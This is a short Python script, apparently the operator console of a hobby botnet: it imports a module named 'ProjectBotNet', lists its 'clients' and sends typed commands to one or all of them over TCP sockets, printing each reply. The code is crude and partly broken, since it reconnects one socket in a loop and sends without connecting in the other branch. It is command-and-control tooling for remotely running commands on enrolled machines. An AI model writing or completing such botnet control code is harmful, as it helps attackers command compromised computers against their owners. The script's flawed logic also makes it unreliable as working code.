import socket
import ProjectBotNet as __main

# Server configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9999

clients = __main.clientsADD

# Connect to server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print(clients)
# Send commands to each client separately until user types "exit"
while True:
    client_id = input("Enter client ID ('all' for all clients): ")
    if client_id.lower() == "exit":
        break
    elif client_id.lower() == "all":
        command = input("Enter command: ")
        for CLI in clients:
            client_socket.connect(('127.0.0.1', 56659))
            client_socket.send(command.encode())
    else:
        command = input("Enter command: ")
        client_socket.send(f"{client_id} {command}".encode())

    # Receive response from server
    response = client_socket.recv(1024)
    print("Server response:", response.decode())

client_socket.close()
